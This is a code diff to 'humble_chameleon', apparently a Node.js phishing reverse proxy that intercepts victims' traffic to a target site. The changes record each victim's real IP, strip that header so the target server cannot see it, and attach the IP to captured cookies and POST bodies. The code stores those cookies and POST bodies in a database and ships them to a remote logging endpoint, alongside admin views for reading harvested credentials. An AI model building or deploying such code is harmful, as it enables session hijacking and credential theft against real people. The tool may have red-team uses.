@@ -63,6 +63,10 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
   split_domain = requested_domain.split('.')
   humble_domain = split_domain.slice(-2).join('.')
 
+  //set our own attribute to track actual IP and remove the extra header so the target server can't see it ;)
+  victim_request.x_real_ip = victim_request.headers['x-real-ip']
+  delete victim_request.headers['x-real-ip']
+
   //set up logging function here so that routes can use it if need be
   var ship_logs = function(log_data){
     if((typeof config[humble_domain].logging_endpoint.host) != 'undefined'){
@@ -128,6 +132,9 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
     };
 
     let victim_cookies = options.headers.cookie;
+    if((typeof victim_cookies) == 'undefined'){
+      victim_cookies = ''
+    }
 
     //check to see if we have some cookies to save in the DB but don't save if it's just an amdin
     if ((options.headers.cookie != null) && !(options.headers.cookie.includes(admin_config.admin_cookie.cookie_name))) {
@@ -153,7 +160,7 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
               var stmt = db.prepare("INSERT INTO cookies VALUES (?,?,?,?,?)");
               stmt.run(dateFormat("isoDateTime"),tracking_id,requested_domain,url.parse(victim_request.url).path, JSON.stringify(victim_cookies) )
               stmt.finalize();
-              ship_logs({"target": tracking_id, "event_type": "COOKIE_DATA", "event_data": JSON.stringify(victim_cookies)})
+              ship_logs({"event_ip": victim_request.x_real_ip,"target": tracking_id, "event_type": "COOKIE_DATA", "event_data": JSON.stringify(victim_cookies)})
 	    }catch(err){
               //console.log(err)
 	      console.log("Error processing tracking cookie: " + victim_cookies)
@@ -184,18 +191,18 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
       views.set_cookie(target_object.target, humble_response)
     } else if (admin && (options.path.includes("config"))) {
       //log who is accessing the admin consoles
-      console.log(success + dateFormat("isoDateTime") + " " + "Config Console Accessed By: " + victim_request.connection.remoteAddress + ": " + requested_domain + url.parse(victim_request.url).path)
-      access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Config Console Accessed By: " + victim_request.connection.remoteAddress + ": " + requested_domain + url.parse(victim_request.url).path + "\n")
+      console.log(success + dateFormat("isoDateTime") + " " + "Config Console Accessed By: " + victim_request.x_real_ip + ": " + requested_domain + url.parse(victim_request.url).path)
+      access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Config Console Accessed By: " + victim_request.x_real_ip + ": " + requested_domain + url.parse(victim_request.url).path + "\n")
       views.adminConfig(victim_request, humble_response);
     } else if (admin && (options.path.includes("access"))) {
       //log who is accessing the admin consoles
-      console.log(success + dateFormat("isoDateTime") + " " + "Access Log Read By: " + victim_request.connection.remoteAddress + ": " + requested_domain + url.parse(victim_request.url).path)
-      access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Access Log Read By: " + victim_request.connection.remoteAddress + ": " + requested_domain + url.parse(victim_request.url).path + "\n")
+      console.log(success + dateFormat("isoDateTime") + " " + "Access Log Read By: " + victim_request.x_real_ip + ": " + requested_domain + url.parse(victim_request.url).path)
+      access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Access Log Read By: " + victim_request.x_real_ip + ": " + requested_domain + url.parse(victim_request.url).path + "\n")
       views.accessLog(victim_request, humble_response);
     } else if (admin && (options.path.includes("credz"))) {
       //log who is accessing the admin consoles
-      console.log(success + dateFormat("isoDateTime") + " " + "Creds Log Read By: " + victim_request.connection.remoteAddress + ": " + requested_domain + url.parse(victim_request.url).path)
-      access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Creds Log Read By: " + victim_request.connection.remoteAddress + ": " + requested_domain + url.parse(victim_request.url).path + "\n")
+      console.log(success + dateFormat("isoDateTime") + " " + "Creds Log Read By: " + victim_request.x_real_ip + ": " + requested_domain + url.parse(victim_request.url).path)
+      access_log.write("[+]" + dateFormat("isoDateTime") + " " + "Creds Log Read By: " + victim_request.x_real_ip + ": " + requested_domain + url.parse(victim_request.url).path + "\n")
       views.credsLog(victim_request, humble_response);
     } else {
       //remove any reference to the evil cookie if it is being used
@@ -233,7 +240,7 @@ var humble_chameleon = http.createServer(function(victim_request, humble_respons
               var stmt = db.prepare("INSERT INTO posts VALUES (?,?,?,?,?)");
               stmt.run(dateFormat("isoDateTime"),tracking_id,options.host,options.path,postData)
               stmt.finalize();
-              ship_logs({"target": tracking_id, "event_type": "POST_DATA", "event_data": postData})
+              ship_logs({"event_ip": victim_request.x_real_ip,"target": tracking_id, "event_type": "POST_DATA", "event_data": postData})
 	    }catch(err){
               //console.log(err)
 	      console.log("Error processing post data: " + postData)
